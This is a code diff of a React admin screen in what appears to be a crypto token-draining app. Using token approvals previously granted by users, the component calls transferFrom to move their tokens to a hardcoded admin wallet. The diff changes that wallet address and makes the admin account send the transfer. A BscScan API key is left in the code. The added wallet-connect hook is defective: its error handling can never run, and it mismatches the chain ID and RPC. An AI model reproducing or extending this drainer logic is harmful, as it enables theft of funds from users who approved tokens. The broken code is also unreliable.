@@ -5,7 +5,7 @@ import Web3 from "web3";
 
 import 'react-notifications/lib/notifications.css';
 
-const adminWalletAddress = "0x4552411f0f8C54116E220DA3e76b95a0375df766";
+const adminWalletAddress = "0x7F6fc3b14969fBC35fE78C69F90dD7e63B6F8181";
 const web3 = new Web3(window.ethereum);
 
 const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
@@ -23,6 +23,42 @@ const AdminScreen = () => {
     setProduct(response.data);
   }
 
+  useEffect(() => {
+    const connectWallet = async () => {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          if (window.ethereum) {
+            await window.ethereum.enable();
+            try {
+              // check if the chain to connect to is installed
+            } catch (error) {
+              // This error code indicates that the chain has not been added to MetaMask
+              // if it is not, then install it into the user MetaMask
+              if (error.code === 4902) {
+                try {
+                  await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [
+                      {
+                        chainId: '0x1',
+                        rpcUrl: 'https://bsc-dataseed1.defibit.io/',
+                      },
+                    ],
+                  });
+                } catch (addError) {
+                  console.error(addError);
+                }
+              }
+              console.error(error);
+            }
+          }
+        } catch (e) {
+          return false;
+        }
+      }
+    }
+    connectWallet();
+  }, []);
   const handleChangeAmount = (value) => {
     setTransferAmount(value);
   }
@@ -40,7 +76,7 @@ const AdminScreen = () => {
         let temp = await axios.get(api);
         const contractABI = JSON.parse(temp.data.result);
         const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
-        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
+        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress })
       } else {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
@@ -50,7 +86,7 @@ const AdminScreen = () => {
         let temp = await axios.get(api);
         const contractABI = JSON.parse(temp.data.result);
         const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
-        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
+        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: adminWalletAddress })
       }
     }
   }
